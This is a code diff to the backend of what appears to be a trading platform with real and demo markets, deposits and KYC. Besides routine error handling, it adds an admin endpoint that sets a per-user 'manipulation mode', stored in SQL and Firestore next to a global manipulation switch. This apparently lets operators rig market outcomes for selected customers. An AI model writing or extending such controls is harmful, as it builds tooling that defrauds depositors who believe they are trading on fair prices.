@@ -19,6 +19,7 @@ import {
   markets_real, markets_demo, 
   systemActive, globalManipulationMode,
   setSystemActive, setGlobalManipulationMode,
+  setUserManipulation,
   isMarketClosedAt
 } from '../services/marketService.ts';
 
@@ -1020,16 +1021,32 @@ export async function syncDatabaseFromFirestore() {
 
   try {
     logger.info('👤 Syncing users...');
-    await syncAllUsersFromFirestore();
+    try {
+      await syncAllUsersFromFirestore();
+    } catch (userErr: any) {
+      logger.error(`Failed to sync users: ${userErr.message}`);
+    }
 
     logger.info('💸 Syncing global transactions...');
-    await syncGlobalTransactionsFromFirestore();
+    try {
+      await syncGlobalTransactionsFromFirestore();
+    } catch (txErr: any) {
+      logger.error(`Failed to sync transactions: ${txErr.message}`);
+    }
 
     logger.info('🪪 Syncing KYC requests...');
-    await syncKYCRequestsFromFirestore();
+    try {
+      await syncKYCRequestsFromFirestore();
+    } catch (kycErr: any) {
+      logger.error(`Failed to sync KYC: ${kycErr.message}`);
+    }
 
     logger.info('📈 Syncing trades...');
-    await syncTradesFromFirestore();
+    try {
+      await syncTradesFromFirestore();
+    } catch (tradeErr: any) {
+      logger.error(`Failed to sync trades: ${tradeErr.message}`);
+    }
 
     // Ensure the seed admin exists and is up to date
     await ensureSeedAdminUser();
@@ -2686,8 +2703,9 @@ router.post('/admin/deposits/update', requireAuth, async (req: AuthRequest, res)
     }
 
     const isSuccessOrApproved = status === 'success' || status === 'approved';
+    logger.info(`Processing deposit update for user ${userId}, status: ${status}, amount: ${finalAmountInBase}, isSuccessOrApproved: ${isSuccessOrApproved}`);
 
-    let depositAmountWithBonus = new Big(finalAmountInBase);
+    let depositAmountWithBonus = new Big(finalAmountInBase || 0);
     if (isSuccessOrApproved && depositData?.promoCode && depositData?.promoBonus) {
         const bonusPercent = new Big(depositData.promoBonus);
         const bonusAmount = new Big(finalAmountInBase).times(bonusPercent).div(100);
@@ -2995,6 +3013,29 @@ router.post('/admin/users/smart-mode', requireAuth, async (req: AuthRequest, res
       [smartModeEnabled ? 1 : 0, smartModeStrategy || 'auto_25_percent', uid]
     );
     res.json({ success: true });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+router.post('/admin/users/manipulation', requireAuth, async (req: AuthRequest, res) => {
+  if (!req.user?.isAdmin) return res.status(403).json({ error: 'Admin only' });
+  const { uid, mode } = req.body;
+  if (!uid || !mode) return res.status(400).json({ error: 'Missing uid or mode' });
+  
+  try {
+    setUserManipulation(uid.toString(), mode);
+    // Update local SQL
+    await run('UPDATE users SET manipulation_mode = ? WHERE uid = ?', [mode, uid]);
+    
+    // Update Firestore to sync
+    const user = await get('SELECT * FROM users WHERE uid = ?', [uid]);
+    if (user) {
+      const mapped = mapUserForFrontend(user);
+      syncUserToFirestore(uid, mapped);
+    }
+    
+    res.json({ success: true, mode });
   } catch (err: any) {
     res.status(500).json({ error: err.message });
   }
